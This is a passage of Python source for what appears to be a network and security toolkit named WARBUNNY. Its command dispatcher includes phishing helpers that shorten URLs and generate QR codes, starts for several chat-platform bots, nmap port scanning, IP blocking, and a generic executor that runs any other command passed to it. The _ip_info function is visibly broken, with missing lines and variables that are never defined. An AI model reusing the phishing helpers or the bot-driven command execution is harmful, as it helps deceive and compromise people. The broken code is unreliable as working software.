            path = self.social.generate_qr_code(args[0] if args else '')
            result = {'success': path is not None, 'output': f"QR code saved to {path}" if path else 'Failed'}
        elif cmd == 'phish_shorten':
            url = self.social.shorten_url(args[0] if args else '')
            result = {'success': url is not None, 'output': f"Shortened URL: {url}" if url else 'Failed'}
        
        # Bot management commands
        elif cmd == 'start_discord':
            self.discord_bot.start_bot_thread()
            result = {'success': True, 'output': 'Discord bot started'}
        elif cmd == 'start_telegram':
            self.telegram_bot.start_bot_thread()
            result = {'success': True, 'output': 'Telegram bot started'}
        elif cmd == 'start_slack':
            self.slack_bot.start_bot_thread()
            result = {'success': True, 'output': 'Slack bot started'}
        elif cmd == 'start_signal':
            self.signal_bot.start_bot_thread()
            result = {'success': True, 'output': 'Signal bot started'}
        elif cmd == 'start_whatsapp':
            self.whatsapp_bot.start_bot_thread()
            result = {'success': True, 'output': 'WhatsApp bot started'}
        elif cmd == 'start_imessage':
            self.imessage_bot.start_bot_thread()
            result = {'success': True, 'output': 'iMessage bot started'}
        elif cmd == 'start_googlechat':
            self.google_chat_bot.start_bot_thread()
            result = {'success': True, 'output': 'Google Chat bot started'}
        
        # IP management commands
        elif cmd == 'add_ip':
            result = self._add_ip(args)
        elif cmd == 'remove_ip':
            result = self._remove_ip(args)
        elif cmd == 'block_ip':
            result = self._block_ip(args)
        elif cmd == 'unblock_ip':
            result = self._unblock_ip(args)
        elif cmd == 'list_ips':
            result = self._list_ips(args)
        elif cmd == 'ip_info':
            result = self._ip_info(args)
        
        # Web dashboard
        elif cmd == 'web':
            result = self._web()
        
        # Generic command
        else:
            result = self.executor.execute(command, source)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        return result

    def _scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: scan <target> [ports]'}
        target = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        result = self.network.nmap(target, f"-p {ports} -T4")
        if result['success']:
            open_ports = []
            for line in result['output'].split('\n'):
                if '/tcp' in line and 'open' in line:
                    parts = line.split()
                    port_proto = parts[0].split('/')
                    if len(port_proto) == 2:
                        open_ports.append({'port': int(port_proto[0]), 'protocol': port_proto[1], 'service': parts[2] if len(parts) > 2 else 'unknown'})
            self.db.log_scan(target, "Standard", open_ports, result.get('execution_time', 0))
            output = f"🔍 Scan Results for {target} (ports {ports})\n{'='*40}\n"
            if open_ports:
                output += f"\n🔓 Open Ports ({len(open_ports)}):\n"
                for p in open_ports[:20]:
                    output += f"  {p['port']}/{p['protocol']} - {p['service']}\n"
            else:
                output += "\nNo open ports found."
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('output', 'Scan failed')}
    
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, 'cli', notes):
                return {'success': True, 'output': f"✅ IP {ip} added to monitoring"}
            return {'success': False, 'output': f"Failed to add IP {ip}"}
        except:
            return {'success': False, 'output': f"Invalid IP: {ip}"}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        if self.db.remove_managed_ip(ip):
            return {'success': True, 'output': f"✅ IP {ip} removed from monitoring"}
        return {'success': False, 'output': f"IP {ip} not found"}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        if self.db.block_ip(ip, reason, 'cli'):
            self.db.log_threat('Manual Block', ip, 'high', reason, f'Blocked by CLI')
            return {'success': True, 'output': f"✅ IP {ip} blocked: {reason}"}
        return {'success': False, 'output': f"Failed to block IP {ip}"}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        if self.db.unblock_ip(ip, 'cli'):
            return {'success': True, 'output': f"✅ IP {ip} unblocked"}
        return {'success': False, 'output': f"Failed to unblock IP {ip}"}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0] == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs found'}
        output = f"🔒 Managed IPs ({len(ips)} total):\n{'='*40}\n"
        for ip in ips:
            status = "🔴 BLOCKED" if ip['is_blocked'] else "🟢 ACTIVE"
            output += f"{ip['ip_address']} - {status}\n"
            if ip.get('notes'): output += f"    Notes: {ip['notes']}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)

            threats = self.db.get_threats_by_ip(ip, 5)

                output += f"\n📍 Location: {location.get('country', 'Unknown')}, {location.get('city', 'Unknown')}\n"
                output += f"   ISP: {location.get('isp', 'Unknown')}\n"
            if db_info:
                output += f"\n📊 Status: {'🔴 Blocked' if db_info.get('is_blocked') else '🟢 Active'}\n"
                output += f"   Added: {db_info.get('added_date', '')[:19]}\n"
                if db_info.get('block_reason'):
                    output += f"   Block Reason: {db_info['block_reason']}\n"
            if threats:
                output += f"\n🚨 Recent Threats ({len(threats)}):\n"
                for t in threats[:3]:
                    output += f"   • {t['threat_type']} - {t['timestamp'][:19]}\n"
            return {'success': True, 'output': output}
        except:
            return {'success': False, 'output': f"Invalid IP: {ip}"}

    def process_command(self, command: str):
        if not command.strip():
            return
        
        self.db.update_session_activity(self.session_id)
        cmd = command.strip().lower()
        
        if cmd == 'exit':
            self.running = False
            print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        elif cmd == 'setup':
            self.setup_bots()
        elif cmd == 'web':
            self.web.start()
            print(f"{Colors.GREEN}✅ Web dashboard started on http://localhost:5000{Colors.RESET}")
        else:
            result = self.handler.execute(command)
            output = result.get('output', '')
            if isinstance(output, dict):
                print(json.dumps(output, indent=2))
            else:
                print(output)
            if result.get('success'):
                print(f"\n{Colors.GREEN}✅ Executed in {result.get('execution_time', 0):.2f}s{Colors.RESET}")
            else:
                print(f"\n{Colors.RED}❌ Failed: {output}{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Setup bots
        if input(f"\n{Colors.YELLOW}Setup bot integrations? (y/n): {Colors.RESET}").strip().lower() == 'y':
            self.setup_bots()
        
        # Start web dashboard
        if input(f"{Colors.YELLOW}Start web dashboard? (y/n): {Colors.RESET}").strip().lower() == 'y':
            self.web.start()
        
        print(f"\n{Colors.GREEN}✅ WARBUNNY Ready!{Colors.RESET}")
        print(f"{Colors.CYAN}   Type 'help' for commands, 'status' for system info{Colors.RESET}\n")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{Colors.ACCENT}{self.session_id}{Colors.PRIMARY}]{Colors.ACCENT} 🐰> {Colors.RESET}"
                command = input(prompt).strip()
                self.process_command(command)
            except KeyboardInterrupt:
